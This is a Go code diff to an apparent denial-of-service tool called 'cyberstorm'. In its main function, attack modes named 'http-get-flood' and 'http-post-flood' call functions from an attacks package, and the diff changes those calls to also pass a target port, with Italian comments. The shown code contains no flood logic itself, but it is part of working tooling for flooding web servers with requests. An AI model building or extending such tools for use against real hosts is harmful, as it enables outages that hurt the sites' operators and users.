@@ -5,7 +5,6 @@ import (
 	"flag"
 	"fmt"
 	"log"
-	"math/rand"
 	"net"
 	"os"
 	"os/signal"
@@ -13,6 +12,7 @@ import (
 	"sync"
 	"syscall"
 	"time"
+	"math/rand"
 
 	"cyberstorm/attacks"
 	"cyberstorm/core"
@@ -159,11 +159,11 @@ func main() {
 		}
 	case "http-get-flood":
 		attackFunc = func() {
-			attacks.SendHTTPGet(*host, *userAgent, wg, ctx)
+			attacks.SendHTTPGet(*host, *port, *userAgent, wg, ctx) // Passa la porta
 		}
 	case "http-post-flood":
 		attackFunc = func() {
-			attacks.SendHTTPPost(*host, *body, *userAgent, wg, ctx)
+			attacks.SendHTTPPost(*host, *port, *body, *userAgent, wg, ctx) // Passa la porta
 		}
 	default:
 		log.Fatalf("Unsupported attack type: %s", *attack)
